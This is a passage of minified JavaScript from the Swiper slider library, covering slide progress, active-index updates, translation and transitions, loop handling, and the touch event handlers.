                    s.cssMode && s.centeredSlides && (l -= a[0].swiperSlideOffset);
                    const c = (o + (s.centeredSlides ? t.minTranslate() : 0) - l) / (i.swiperSlideSize + s.spaceBetween),
                        d = (o - r[0] + (s.centeredSlides ? t.minTranslate() : 0) - l) / (i.swiperSlideSize + s.spaceBetween),
                        u = -(o - l),
                        p = u + t.slidesSizesGrid[e];
                    (u >= 0 && u < t.size - 1 || p > 1 && p <= t.size || u <= 0 && p >= t.size) && (t.visibleSlides.push(i), t.visibleSlidesIndexes.push(e), a.eq(e).addClass(s.slideVisibleClass)), i.progress = n ? -c : c, i.originalProgress = n ? -d : d
                }
                t.visibleSlides = c(t.visibleSlides)
            },
            updateProgress: function(e) {
                const t = this;
                if (void 0 === e) {
                    const s = t.rtlTranslate ? -1 : 1;
                    e = t && t.translate && t.translate * s || 0
                }
                const s = t.params,
                    a = t.maxTranslate() - t.minTranslate();
                let {
                    progress: n,
                    isBeginning: r,
                    isEnd: o
                } = t;
                const i = r,
                    l = o;
                0 === a ? (n = 0, r = !0, o = !0) : (n = (e - t.minTranslate()) / a, r = n <= 0, o = n >= 1), Object.assign(t, {
                    progress: n,
                    isBeginning: r,
                    isEnd: o
                }), (s.watchSlidesProgress || s.centeredSlides && s.autoHeight) && t.updateSlidesProgress(e), r && !i && t.emit("reachBeginning toEdge"), o && !l && t.emit("reachEnd toEdge"), (i && !r || l && !o) && t.emit("fromEdge"), t.emit("progress", n)
            },
            updateSlidesClasses: function() {
                const e = this,
                    {
                        slides: t,
                        params: s,
                        $wrapperEl: a,
                        activeIndex: n,
                        realIndex: r
                    } = e,
                    o = e.virtual && s.virtual.enabled;
                let i;
                t.removeClass(`${s.slideActiveClass} ${s.slideNextClass} ${s.slidePrevClass} ${s.slideDuplicateActiveClass} ${s.slideDuplicateNextClass} ${s.slideDuplicatePrevClass}`), i = o ? e.$wrapperEl.find(`.${s.slideClass}[data-swiper-slide-index="${n}"]`) : t.eq(n), i.addClass(s.slideActiveClass), s.loop && (i.hasClass(s.slideDuplicateClass) ? a.children(`.${s.slideClass}:not(.${s.slideDuplicateClass})[data-swiper-slide-index="${r}"]`).addClass(s.slideDuplicateActiveClass) : a.children(`.${s.slideClass}.${s.slideDuplicateClass}[data-swiper-slide-index="${r}"]`).addClass(s.slideDuplicateActiveClass));
                let l = i.nextAll(`.${s.slideClass}`).eq(0).addClass(s.slideNextClass);
                s.loop && 0 === l.length && (l = t.eq(0), l.addClass(s.slideNextClass));
                let c = i.prevAll(`.${s.slideClass}`).eq(0).addClass(s.slidePrevClass);
                s.loop && 0 === c.length && (c = t.eq(-1), c.addClass(s.slidePrevClass)), s.loop && (l.hasClass(s.slideDuplicateClass) ? a.children(`.${s.slideClass}:not(.${s.slideDuplicateClass})[data-swiper-slide-index="${l.attr("data-swiper-slide-index")}"]`).addClass(s.slideDuplicateNextClass) : a.children(`.${s.slideClass}.${s.slideDuplicateClass}[data-swiper-slide-index="${l.attr("data-swiper-slide-index")}"]`).addClass(s.slideDuplicateNextClass), c.hasClass(s.slideDuplicateClass) ? a.children(`.${s.slideClass}:not(.${s.slideDuplicateClass})[data-swiper-slide-index="${c.attr("data-swiper-slide-index")}"]`).addClass(s.slideDuplicatePrevClass) : a.children(`.${s.slideClass}.${s.slideDuplicateClass}[data-swiper-slide-index="${c.attr("data-swiper-slide-index")}"]`).addClass(s.slideDuplicatePrevClass)), e.emitSlidesClasses()
            },
            updateActiveIndex: function(e) {
                const t = this,
                    s = t.rtlTranslate ? t.translate : -t.translate,
                    {
                        slidesGrid: a,
                        snapGrid: n,
                        params: r,
                        activeIndex: o,
                        realIndex: i,
                        snapIndex: l
                    } = t;
                let c, d = e;
                if (void 0 === d) {
                    for (let e = 0; e < a.length; e += 1) void 0 !== a[e + 1] ? s >= a[e] && s < a[e + 1] - (a[e + 1] - a[e]) / 2 ? d = e : s >= a[e] && s < a[e + 1] && (d = e + 1) : s >= a[e] && (d = e);
                    r.normalizeSlideIndex && (d < 0 || void 0 === d) && (d = 0)
                }
                if (n.indexOf(s) >= 0) c = n.indexOf(s);
                else {
                    const e = Math.min(r.slidesPerGroupSkip, d);
                    c = e + Math.floor((d - e) / r.slidesPerGroup)
                }
                if (c >= n.length && (c = n.length - 1), d === o) return void(c !== l && (t.snapIndex = c, t.emit("snapIndexChange")));
                const u = parseInt(t.slides.eq(d).attr("data-swiper-slide-index") || d, 10);
                Object.assign(t, {
                    snapIndex: c,
                    realIndex: u,
                    previousIndex: o,
                    activeIndex: d
                }), t.emit("activeIndexChange"), t.emit("snapIndexChange"), i !== u && t.emit("realIndexChange"), (t.initialized || t.params.runCallbacksOnInit) && t.emit("slideChange")
            },
            updateClickedSlide: function(e) {
                const t = this,
                    s = t.params,
                    a = c(e).closest(`.${s.slideClass}`)[0];
                let n, r = !1;
                if (a)
                    for (let e = 0; e < t.slides.length; e += 1)
                        if (t.slides[e] === a) {
                            r = !0, n = e;
                            break
                        } if (!a || !r) return t.clickedSlide = void 0, void(t.clickedIndex = void 0);
                t.clickedSlide = a, t.virtual && t.params.virtual.enabled ? t.clickedIndex = parseInt(c(a).attr("data-swiper-slide-index"), 10) : t.clickedIndex = n, s.slideToClickedSlide && void 0 !== t.clickedIndex && t.clickedIndex !== t.activeIndex && t.slideToClickedSlide()
            }
        },
        T = {
            getTranslate: function(e) {
                void 0 === e && (e = this.isHorizontal() ? "x" : "y");
                const {
                    params: t,
                    rtlTranslate: s,
                    translate: a,
                    $wrapperEl: n
                } = this;
                if (t.virtualTranslate) return s ? -a : a;
                if (t.cssMode) return a;
                let r = m(n[0], e);
                return s && (r = -r), r || 0
            },
            setTranslate: function(e, t) {
                const s = this,
                    {
                        rtlTranslate: a,
                        params: n,
                        $wrapperEl: r,
                        wrapperEl: o,
                        progress: i
                    } = s;
                let l, c = 0,
                    d = 0;
                s.isHorizontal() ? c = a ? -e : e : d = e, n.roundLengths && (c = Math.floor(c), d = Math.floor(d)), n.cssMode ? o[s.isHorizontal() ? "scrollLeft" : "scrollTop"] = s.isHorizontal() ? -c : -d : n.virtualTranslate || r.transform(`translate3d(${c}px, ${d}px, 0px)`), s.previousTranslate = s.translate, s.translate = s.isHorizontal() ? c : d;
                const u = s.maxTranslate() - s.minTranslate();
                l = 0 === u ? 0 : (e - s.minTranslate()) / u, l !== i && s.updateProgress(e), s.emit("setTranslate", s.translate, t)
            },
            minTranslate: function() {
                return -this.snapGrid[0]
            },
            maxTranslate: function() {
                return -this.snapGrid[this.snapGrid.length - 1]
            },
            translateTo: function(e, t, s, a, n) {
                void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === s && (s = !0), void 0 === a && (a = !0);
                const r = this,
                    {
                        params: o,
                        wrapperEl: i
                    } = r;
                if (r.animating && o.preventInteractionOnTransition) return !1;
                const l = r.minTranslate(),
                    c = r.maxTranslate();
                let d;
                if (d = a && e > l ? l : a && e < c ? c : e, r.updateProgress(d), o.cssMode) {
                    const e = r.isHorizontal();
                    if (0 === t) i[e ? "scrollLeft" : "scrollTop"] = -d;
                    else {
                        if (!r.support.smoothScroll) return v({
                            swiper: r,
                            targetPosition: -d,
                            side: e ? "left" : "top"
                        }), !0;
                        i.scrollTo({
                            [e ? "left" : "top"]: -d,
                            behavior: "smooth"
                        })
                    }
                    return !0
                }
                return 0 === t ? (r.setTransition(0), r.setTranslate(d), s && (r.emit("beforeTransitionStart", t, n), r.emit("transitionEnd"))) : (r.setTransition(t), r.setTranslate(d), s && (r.emit("beforeTransitionStart", t, n), r.emit("transitionStart")), r.animating || (r.animating = !0, r.onTranslateToWrapperTransitionEnd || (r.onTranslateToWrapperTransitionEnd = function(e) {
                    r && !r.destroyed && e.target === this && (r.$wrapperEl[0].removeEventListener("transitionend", r.onTranslateToWrapperTransitionEnd), r.$wrapperEl[0].removeEventListener("webkitTransitionEnd", r.onTranslateToWrapperTransitionEnd), r.onTranslateToWrapperTransitionEnd = null, delete r.onTranslateToWrapperTransitionEnd, s && r.emit("transitionEnd"))
                }), r.$wrapperEl[0].addEventListener("transitionend", r.onTranslateToWrapperTransitionEnd), r.$wrapperEl[0].addEventListener("webkitTransitionEnd", r.onTranslateToWrapperTransitionEnd))), !0
            }
        };

    function x(e) {
        let {
            swiper: t,
            runCallbacks: s,
            direction: a,
            step: n
        } = e;
        const {
            activeIndex: r,
            previousIndex: o
        } = t;
        let i = a;
        if (i || (i = r > o ? "next" : r < o ? "prev" : "reset"), t.emit(`transition${n}`), s && r !== o) {
            if ("reset" === i) return void t.emit(`slideResetTransition${n}`);
            t.emit(`slideChangeTransition${n}`), "next" === i ? t.emit(`slideNextTransition${n}`) : t.emit(`slidePrevTransition${n}`)
        }
    }
    var S = {
            slideTo: function(e, t, s, a, n) {
                if (void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === s && (s = !0), "number" != typeof e && "string" != typeof e) throw new Error(`The 'index' argument cannot have type other than 'number' or 'string'. [${typeof e}] given.`);
                if ("string" == typeof e) {
                    const t = parseInt(e, 10);
                    if (!isFinite(t)) throw new Error(`The passed-in 'index' (string) couldn't be converted to 'number'. [${e}] given.`);
                    e = t
                }
                const r = this;
                let o = e;
                o < 0 && (o = 0);
                const {
                    params: i,
                    snapGrid: l,
                    slidesGrid: c,
                    previousIndex: d,
                    activeIndex: u,
                    rtlTranslate: p,
                    wrapperEl: m,
                    enabled: f
                } = r;
                if (r.animating && i.preventInteractionOnTransition || !f && !a && !n) return !1;
                const h = Math.min(r.params.slidesPerGroupSkip, o);
                let g = h + Math.floor((o - h) / r.params.slidesPerGroup);
                g >= l.length && (g = l.length - 1);
                const y = -l[g];
                if (i.normalizeSlideIndex)
                    for (let e = 0; e < c.length; e += 1) {
                        const t = -Math.floor(100 * y),
                            s = Math.floor(100 * c[e]),
                            a = Math.floor(100 * c[e + 1]);
                        void 0 !== c[e + 1] ? t >= s && t < a - (a - s) / 2 ? o = e : t >= s && t < a && (o = e + 1) : t >= s && (o = e)
                    }
                if (r.initialized && o !== u) {
                    if (!r.allowSlideNext && y < r.translate && y < r.minTranslate()) return !1;
                    if (!r.allowSlidePrev && y > r.translate && y > r.maxTranslate() && (u || 0) !== o) return !1
                }
                let b;
                if (o !== (d || 0) && s && r.emit("beforeSlideChangeStart"), r.updateProgress(y), b = o > u ? "next" : o < u ? "prev" : "reset", p && -y === r.translate || !p && y === r.translate) return r.updateActiveIndex(o), i.autoHeight && r.updateAutoHeight(), r.updateSlidesClasses(), "slide" !== i.effect && r.setTranslate(y), "reset" !== b && (r.transitionStart(s, b), r.transitionEnd(s, b)), !1;
                if (i.cssMode) {
                    const e = r.isHorizontal(),
                        s = p ? y : -y;
                    if (0 === t) {
                        const t = r.virtual && r.params.virtual.enabled;
                        t && (r.wrapperEl.style.scrollSnapType = "none", r._immediateVirtual = !0), m[e ? "scrollLeft" : "scrollTop"] = s, t && requestAnimationFrame((() => {
                            r.wrapperEl.style.scrollSnapType = "", r._swiperImmediateVirtual = !1
                        }))
                    } else {
                        if (!r.support.smoothScroll) return v({
                            swiper: r,
                            targetPosition: s,
                            side: e ? "left" : "top"
                        }), !0;
                        m.scrollTo({
                            [e ? "left" : "top"]: s,
                            behavior: "smooth"
                        })
                    }
                    return !0
                }
                return r.setTransition(t), r.setTranslate(y), r.updateActiveIndex(o), r.updateSlidesClasses(), r.emit("beforeTransitionStart", t, a), r.transitionStart(s, b), 0 === t ? r.transitionEnd(s, b) : r.animating || (r.animating = !0, r.onSlideToWrapperTransitionEnd || (r.onSlideToWrapperTransitionEnd = function(e) {
                    r && !r.destroyed && e.target === this && (r.$wrapperEl[0].removeEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.$wrapperEl[0].removeEventListener("webkitTransitionEnd", r.onSlideToWrapperTransitionEnd), r.onSlideToWrapperTransitionEnd = null, delete r.onSlideToWrapperTransitionEnd, r.transitionEnd(s, b))
                }), r.$wrapperEl[0].addEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.$wrapperEl[0].addEventListener("webkitTransitionEnd", r.onSlideToWrapperTransitionEnd)), !0
            },
            slideToLoop: function(e, t, s, a) {
                if (void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === s && (s = !0), "string" == typeof e) {
                    const t = parseInt(e, 10);
                    if (!isFinite(t)) throw new Error(`The passed-in 'index' (string) couldn't be converted to 'number'. [${e}] given.`);
                    e = t
                }
                const n = this;
                let r = e;
                return n.params.loop && (r += n.loopedSlides), n.slideTo(r, t, s, a)
            },
            slideNext: function(e, t, s) {
                void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
                const a = this,
                    {
                        animating: n,
                        enabled: r,
                        params: o
                    } = a;
                if (!r) return a;
                let i = o.slidesPerGroup;
                "auto" === o.slidesPerView && 1 === o.slidesPerGroup && o.slidesPerGroupAuto && (i = Math.max(a.slidesPerViewDynamic("current", !0), 1));
                const l = a.activeIndex < o.slidesPerGroupSkip ? 1 : i;
                if (o.loop) {
                    if (n && o.loopPreventsSlide) return !1;
                    a.loopFix(), a._clientLeft = a.$wrapperEl[0].clientLeft
                }
                return o.rewind && a.isEnd ? a.slideTo(0, e, t, s) : a.slideTo(a.activeIndex + l, e, t, s)
            },
            slidePrev: function(e, t, s) {
                void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
                const a = this,
                    {
                        params: n,
                        animating: r,
                        snapGrid: o,
                        slidesGrid: i,
                        rtlTranslate: l,
                        enabled: c
                    } = a;
                if (!c) return a;
                if (n.loop) {
                    if (r && n.loopPreventsSlide) return !1;
                    a.loopFix(), a._clientLeft = a.$wrapperEl[0].clientLeft
                }

                function d(e) {
                    return e < 0 ? -Math.floor(Math.abs(e)) : Math.floor(e)
                }
                const u = d(l ? a.translate : -a.translate),
                    p = o.map((e => d(e)));
                let m = o[p.indexOf(u) - 1];
                if (void 0 === m && n.cssMode) {
                    let e;
                    o.forEach(((t, s) => {
                        u >= t && (e = s)
                    })), void 0 !== e && (m = o[e > 0 ? e - 1 : e])
                }
                let f = 0;
                if (void 0 !== m && (f = i.indexOf(m), f < 0 && (f = a.activeIndex - 1), "auto" === n.slidesPerView && 1 === n.slidesPerGroup && n.slidesPerGroupAuto && (f = f - a.slidesPerViewDynamic("previous", !0) + 1, f = Math.max(f, 0))), n.rewind && a.isBeginning) {
                    const n = a.params.virtual && a.params.virtual.enabled && a.virtual ? a.virtual.slides.length - 1 : a.slides.length - 1;
                    return a.slideTo(n, e, t, s)
                }
                return a.slideTo(f, e, t, s)
            },
            slideReset: function(e, t, s) {
                return void 0 === e && (e = this.params.speed), void 0 === t && (t = !0), this.slideTo(this.activeIndex, e, t, s)
            },
            slideToClosest: function(e, t, s, a) {
                void 0 === e && (e = this.params.speed), void 0 === t && (t = !0), void 0 === a && (a = .5);
                const n = this;
                let r = n.activeIndex;
                const o = Math.min(n.params.slidesPerGroupSkip, r),
                    i = o + Math.floor((r - o) / n.params.slidesPerGroup),
                    l = n.rtlTranslate ? n.translate : -n.translate;
                if (l >= n.snapGrid[i]) {
                    const e = n.snapGrid[i];
                    l - e > (n.snapGrid[i + 1] - e) * a && (r += n.params.slidesPerGroup)
                } else {
                    const e = n.snapGrid[i - 1];
                    l - e <= (n.snapGrid[i] - e) * a && (r -= n.params.slidesPerGroup)
                }
                return r = Math.max(r, 0), r = Math.min(r, n.slidesGrid.length - 1), n.slideTo(r, e, t, s)
            },
            slideToClickedSlide: function() {
                const e = this,
                    {
                        params: t,
                        $wrapperEl: s
                    } = e,
                    a = "auto" === t.slidesPerView ? e.slidesPerViewDynamic() : t.slidesPerView;
                let n, r = e.clickedIndex;
                if (t.loop) {
                    if (e.animating) return;
                    n = parseInt(c(e.clickedSlide).attr("data-swiper-slide-index"), 10), t.centeredSlides ? r < e.loopedSlides - a / 2 || r > e.slides.length - e.loopedSlides + a / 2 ? (e.loopFix(), r = s.children(`.${t.slideClass}[data-swiper-slide-index="${n}"]:not(.${t.slideDuplicateClass})`).eq(0).index(), u((() => {
                        e.slideTo(r)
                    }))) : e.slideTo(r) : r > e.slides.length - a ? (e.loopFix(), r = s.children(`.${t.slideClass}[data-swiper-slide-index="${n}"]:not(.${t.slideDuplicateClass})`).eq(0).index(), u((() => {
                        e.slideTo(r)
                    }))) : e.slideTo(r)
                } else e.slideTo(r)
            }
        },
        A = {
            loopCreate: function() {
                const e = this,
                    t = a(),
                    {
                        params: s,
                        $wrapperEl: n
                    } = e,
                    r = n.children().length > 0 ? c(n.children()[0].parentNode) : n;
                r.children(`.${s.slideClass}.${s.slideDuplicateClass}`).remove();
                let o = r.children(`.${s.slideClass}`);
                if (s.loopFillGroupWithBlank) {
                    const e = s.slidesPerGroup - o.length % s.slidesPerGroup;
                    if (e !== s.slidesPerGroup) {
                        for (let a = 0; a < e; a += 1) {
                            const e = c(t.createElement("div")).addClass(`${s.slideClass} ${s.slideBlankClass}`);
                            r.append(e)
                        }
                        o = r.children(`.${s.slideClass}`)
                    }
                }
                "auto" !== s.slidesPerView || s.loopedSlides || (s.loopedSlides = o.length), e.loopedSlides = Math.ceil(parseFloat(s.loopedSlides || s.slidesPerView, 10)), e.loopedSlides += s.loopAdditionalSlides, e.loopedSlides > o.length && e.params.loopedSlidesLimit && (e.loopedSlides = o.length);
                const i = [],
                    l = [];
                o.each(((e, t) => {
                    c(e).attr("data-swiper-slide-index", t)
                }));
                for (let t = 0; t < e.loopedSlides; t += 1) {
                    const e = t - Math.floor(t / o.length) * o.length;
                    l.push(o.eq(e)[0]), i.unshift(o.eq(o.length - e - 1)[0])
                }
                for (let e = 0; e < l.length; e += 1) r.append(c(l[e].cloneNode(!0)).addClass(s.slideDuplicateClass));
                for (let e = i.length - 1; e >= 0; e -= 1) r.prepend(c(i[e].cloneNode(!0)).addClass(s.slideDuplicateClass))
            },
            loopFix: function() {
                const e = this;
                e.emit("beforeLoopFix");
                const {
                    activeIndex: t,
                    slides: s,
                    loopedSlides: a,
                    allowSlidePrev: n,
                    allowSlideNext: r,
                    snapGrid: o,
                    rtlTranslate: i
                } = e;
                let l;
                e.allowSlidePrev = !0, e.allowSlideNext = !0;
                const c = -o[t] - e.getTranslate();
                t < a ? (l = s.length - 3 * a + t, l += a, e.slideTo(l, 0, !1, !0) && 0 !== c && e.setTranslate((i ? -e.translate : e.translate) - c)) : t >= s.length - a && (l = -s.length + t + a, l += a, e.slideTo(l, 0, !1, !0) && 0 !== c && e.setTranslate((i ? -e.translate : e.translate) - c)), e.allowSlidePrev = n, e.allowSlideNext = r, e.emit("loopFix")
            },
            loopDestroy: function() {
                const {
                    $wrapperEl: e,
                    params: t,
                    slides: s
                } = this;
                e.children(`.${t.slideClass}.${t.slideDuplicateClass},.${t.slideClass}.${t.slideBlankClass}`).remove(), s.removeAttr("data-swiper-slide-index")
            }
        };

    function k(e) {
        const t = this,
            s = a(),
            n = r(),
            o = t.touchEventsData,
            {
                params: i,
                touches: l,
                enabled: d
            } = t;
        if (!d) return;
        if (t.animating && i.preventInteractionOnTransition) return;
        !t.animating && i.cssMode && i.loop && t.loopFix();
        let u = e;
        u.originalEvent && (u = u.originalEvent);
        let m = c(u.target);
        if ("wrapper" === i.touchEventsTarget && !m.closest(t.wrapperEl).length) return;
        if (o.isTouchEvent = "touchstart" === u.type, !o.isTouchEvent && "which" in u && 3 === u.which) return;
        if (!o.isTouchEvent && "button" in u && u.button > 0) return;
        if (o.isTouched && o.isMoved) return;
        const f = !!i.noSwipingClass && "" !== i.noSwipingClass,
            h = e.composedPath ? e.composedPath() : e.path;
        f && u.target && u.target.shadowRoot && h && (m = c(h[0]));
        const g = i.noSwipingSelector ? i.noSwipingSelector : `.${i.noSwipingClass}`,
            y = !(!u.target || !u.target.shadowRoot);
        if (i.noSwiping && (y ? function(e, t) {
                return void 0 === t && (t = this),
                    function t(s) {
                        if (!s || s === a() || s === r()) return null;
                        s.assignedSlot && (s = s.assignedSlot);
                        const n = s.closest(e);
                        return n || s.getRootNode ? n || t(s.getRootNode().host) : null
                    }(t)
            }(g, m[0]) : m.closest(g)[0])) return void(t.allowClick = !0);
        if (i.swipeHandler && !m.closest(i.swipeHandler)[0]) return;
        l.currentX = "touchstart" === u.type ? u.targetTouches[0].pageX : u.pageX, l.currentY = "touchstart" === u.type ? u.targetTouches[0].pageY : u.pageY;
        const v = l.currentX,
            b = l.currentY,
            w = i.edgeSwipeDetection || i.iOSEdgeSwipeDetection,
            C = i.edgeSwipeThreshold || i.iOSEdgeSwipeThreshold;
        if (w && (v <= C || v >= n.innerWidth - C)) {
            if ("prevent" !== w) return;
            e.preventDefault()
        }
        if (Object.assign(o, {
                isTouched: !0,
                isMoved: !1,
                allowTouchCallbacks: !0,
                isScrolling: void 0,
                startMoving: void 0
            }), l.startX = v, l.startY = b, o.touchStartTime = p(), t.allowClick = !0, t.updateSize(), t.swipeDirection = void 0, i.threshold > 0 && (o.allowThresholdMove = !1), "touchstart" !== u.type) {
            let e = !0;
            m.is(o.focusableElements) && (e = !1, "SELECT" === m[0].nodeName && (o.isTouched = !1)), s.activeElement && c(s.activeElement).is(o.focusableElements) && s.activeElement !== m[0] && s.activeElement.blur();
            const a = e && t.allowTouchMove && i.touchStartPreventDefault;
            !i.touchStartForcePreventDefault && !a || m[0].isContentEditable || u.preventDefault()
        }
        t.params.freeMode && t.params.freeMode.enabled && t.freeMode && t.animating && !i.cssMode && t.freeMode.onTouchStart(), t.emit("touchStart", u)
    }

    function M(e) {
        const t = a(),
            s = this,
            n = s.touchEventsData,
            {
                params: r,
                touches: o,
                rtlTranslate: i,
                enabled: l
            } = s;
        if (!l) return;
        let d = e;
        if (d.originalEvent && (d = d.originalEvent), !n.isTouched) return void(n.startMoving && n.isScrolling && s.emit("touchMoveOpposite", d));
        if (n.isTouchEvent && "touchmove" !== d.type) return;
        const u = "touchmove" === d.type && d.targetTouches && (d.targetTouches[0] || d.changedTouches[0]),
            m = "touchmove" === d.type ? u.pageX : d.pageX,
            f = "touchmove" === d.type ? u.pageY : d.pageY;
        if (d.preventedByNestedSwiper) return o.startX = m, void(o.startY = f);
        if (!s.allowTouchMove) return c(d.target).is(n.focusableElements) || (s.allowClick = !1), void(n.isTouched && (Object.assign(o, {
            startX: m,
            startY: f,
            currentX: m,
            currentY: f
        }), n.touchStartTime = p()));
        if (n.isTouchEvent && r.touchReleaseOnEdges && !r.loop)
            if (s.isVertical()) {
                if (f < o.startY && s.translate <= s.maxTranslate() || f > o.startY && s.translate >= s.minTranslate()) return n.isTouched = !1, void(n.isMoved = !1)
            } else if (m < o.startX && s.translate <= s.maxTranslate() || m > o.startX && s.translate >= s.minTranslate()) return;
        if (n.isTouchEvent && t.activeElement && d.target === t.activeElement && c(d.target).is(n.focusableElements)) return n.isMoved = !0, void(s.allowClick = !1);
        if (n.allowTouchCallbacks && s.emit("touchMove", d), d.targetTouches && d.targetTouches.length > 1) return;
        o.currentX = m, o.currentY = f;
        const h = o.currentX - o.startX,
            g = o.currentY - o.startY;
        if (s.params.threshold && Math.sqrt(h ** 2 + g ** 2) < s.params.threshold) return;
        if (void 0 === n.isScrolling) {
            let e;
            s.isHorizontal() && o.currentY === o.startY || s.isVertical() && o.currentX === o.startX ? n.isScrolling = !1 : h * h + g * g >= 25 && (e = 180 * Math.atan2(Math.abs(g), Math.abs(h)) / Math.PI, n.isScrolling = s.isHorizontal() ? e > r.touchAngle : 90 - e > r.touchAngle)
        }
        if (n.isScrolling && s.emit("touchMoveOpposite", d), void 0 === n.startMoving && (o.currentX === o.startX && o.currentY === o.startY || (n.startMoving = !0)), n.isScrolling) return void(n.isTouched = !1);
        if (!n.startMoving) return;
        s.allowClick = !1, !r.cssMode && d.cancelable && d.preventDefault(), r.touchMoveStopPropagation && !r.nested && d.stopPropagation(), n.isMoved || (r.loop && !r.cssMode && s.loopFix(), n.startTranslate = s.getTranslate(), s.setTransition(0), s.animating && s.$wrapperEl.trigger("webkitTransitionEnd transitionend"), n.allowMomentumBounce = !1, !r.grabCursor || !0 !== s.allowSlideNext && !0 !== s.allowSlidePrev || s.setGrabCursor(!0), s.emit("sliderFirstMove", d)), s.emit("sliderMove", d), n.isMoved = !0;
        let y = s.isHorizontal() ? h : g;
        o.diff = y, y *= r.touchRatio, i && (y = -y), s.swipeDirection = y > 0 ? "prev" : "next", n.currentTranslate = y + n.startTranslate;
        let v = !0,
            b = r.resistanceRatio;
        if (r.touchReleaseOnEdges && (b = 0), y > 0 && n.currentTranslate > s.minTranslate() ? (v = !1, r.resistance && (n.currentTranslate = s.minTranslate() - 1 + (-s.minTranslate() + n.startTranslate + y) ** b)) : y < 0 && n.currentTranslate < s.maxTranslate() && (v = !1, r.resistance && (n.currentTranslate = s.maxTranslate() + 1 - (s.maxTranslate() - n.startTranslate - y) ** b)), v && (d.preventedByNestedSwiper = !0), !s.allowSlideNext && "next" === s.swipeDirection && n.currentTranslate < n.startTranslate && (n.currentTranslate = n.startTranslate), !s.allowSlidePrev && "prev" === s.swipeDirection && n.currentTranslate > n.startTranslate && (n.currentTranslate = n.startTranslate), s.allowSlidePrev || s.allowSlideNext || (n.currentTranslate = n.startTranslate), r.threshold > 0) {
            if (!(Math.abs(y) > r.threshold || n.allowThresholdMove)) return void(n.currentTranslate = n.startTranslate);
            if (!n.allowThresholdMove) return n.allowThresholdMove = !0, o.startX = o.currentX, o.startY = o.currentY, n.currentTranslate = n.startTranslate, void(o.diff = s.isHorizontal() ? o.currentX - o.startX : o.currentY - o.startY)
        }
        r.followFinger && !r.cssMode && ((r.freeMode && r.freeMode.enabled && s.freeMode || r.watchSlidesProgress) && (s.updateActiveIndex(), s.updateSlidesClasses()), s.params.freeMode && r.freeMode.enabled && s.freeMode && s.freeMode.onTouchMove(), s.updateProgress(n.currentTranslate), s.setTranslate(n.currentTranslate))
    }

    function I(e) {
        const t = this,
            s = t.touchEventsData,
            {
                params: a,
                touches: n,
                rtlTranslate: r,
                slidesGrid: o,
                enabled: i
            } = t;
        if (!i) return;
        let l = e;
        if (l.originalEvent && (l = l.originalEvent), s.allowTouchCallbacks && t.emit("touchEnd", l), s.allowTouchCallbacks = !1, !s.isTouched) return s.isMoved && a.grabCursor && t.setGrabCursor(!1), s.isMoved = !1, void(s.startMoving = !1);
        a.grabCursor && s.isMoved && s.isTouched && (!0 === t.allowSlideNext || !0 === t.allowSlidePrev) && t.setGrabCursor(!1);
        const c = p(),
            d = c - s.touchStartTime;
        if (t.allowClick) {
            const e = l.path || l.composedPath && l.composedPath();
            t.updateClickedSlide(e && e[0] || l.target), t.emit("tap click", l), d < 300 && c - s.lastClickTime < 300 && t.emit("doubleTap doubleClick", l)
        }
        if (s.lastClickTime = p(), u((() => {
                t.destroyed || (t.allowClick = !0)
            })), !s.isTouched || !s.isMoved || !t.swipeDirection || 0 === n.diff || s.currentTranslate === s.startTranslate) return s.isTouched = !1, s.isMoved = !1, void(s.startMoving = !1);
        let m;
        if (s.isTouched = !1, s.isMoved = !1, s.startMoving = !1, m = a.followFinger ? r ? t.translate : -t.translate : -s.currentTranslate, a.cssMode) return;
        if (t.params.freeMode && a.freeMode.enabled) return void t.freeMode.onTouchEnd({
            currentPos: m
        });
        let f = 0,
            h = t.slidesSizesGrid[0];
        for (let e = 0; e < o.length; e += e < a.slidesPerGroupSkip ? 1 : a.slidesPerGroup) {
            const t = e < a.slidesPerGroupSkip - 1 ? 1 : a.slidesPerGroup;
            void 0 !== o[e + t] ? m >= o[e] && m < o[e + t] && (f = e, h = o[e + t] - o[e]) : m >= o[e] && (f = e, h = o[o.length - 1] - o[o.length - 2])
        }
        let g = null,
            y = null;
        a.rewind && (t.isBeginning ? y = t.params.virtual && t.params.virtual.enabled && t.virtual ? t.virtual.slides.length - 1 : t.slides.length - 1 : t.isEnd && (g = 0));
        const v = (m - o[f]) / h,
            b = f < a.slidesPerGroupSkip - 1 ? 1 : a.slidesPerGroup;
        if (d > a.longSwipesMs) {
            if (!a.longSwipes) return void t.slideTo(t.activeIndex);
            "next" === t.swipeDirection && (v >= a.longSwipesRatio ? t.slideTo(a.rewind && t.isEnd ? g : f + b) : t.slideTo(f)), "prev" === t.swipeDirection && (v > 1 - a.longSwipesRatio ? t.slideTo(f + b) : null !== y && v < 0 && Math.abs(v) > a.longSwipesRatio ? t.slideTo(y) : t.slideTo(f))
        } else {
            if (!a.shortSwipes) return void t.slideTo(t.activeIndex);
            !t.navigation || l.target !== t.navigation.nextEl && l.target !== t.navigation.prevEl ? ("next" === t.swipeDirection && t.slideTo(null !== g ? g : f + b), "prev" === t.swipeDirection && t.slideTo(null !== y ? y : f)) : l.target === t.navigation.nextEl ? t.slideTo(f + b) : t.slideTo(f)
        }
    }

    function P() {
        const e = this,
            {
                params: t,
                el: s
            } = e;
        if (s && 0 === s.offsetWidth) return;
        t.breakpoints && e.setBreakpoint();
        const {
            allowSlideNext: a,
            allowSlidePrev: n,
            snapGrid: r
        } = e;
        e.allowSlideNext = !0, e.allowSlidePrev = !0, e.updateSize(), e.updateSlides(), e.updateSlidesClasses(), ("auto" === t.slidesPerView || t.slidesPerView > 1) && e.isEnd && !e.isBeginning && !e.params.centeredSlides ? e.slideTo(e.slides.length - 1, 0, !1, !0) : e.slideTo(e.activeIndex, 0, !1, !0), e.autoplay && e.autoplay.running && e.autoplay.paused && e.autoplay.run(), e.allowSlidePrev = n, e.allowSlideNext = a, e.params.watchOverflow && r !== e.snapGrid && e.checkOverflow()
    }

    function D(e) {
        const t = this;
        t.enabled && (t.allowClick || (t.params.preventClicks && e.preventDefault(), t.params.preventClicksPropagation && t.animating && (e.stopPropagation(), e.stopImmediatePropagation())))
    }

    function H() {
        const e = this,
            {
                wrapperEl: t,
                rtlTranslate: s,
                enabled: a
            } = e;
        if (!a) return;
        let n;
